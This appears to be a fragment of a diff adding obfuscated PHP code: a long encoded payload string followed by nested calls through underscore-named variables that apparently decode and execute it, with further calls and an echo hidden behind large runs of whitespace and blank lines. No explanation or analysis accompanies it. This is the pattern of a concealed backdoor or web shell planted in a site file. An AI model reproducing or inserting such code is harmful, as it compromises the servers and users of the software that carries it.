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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
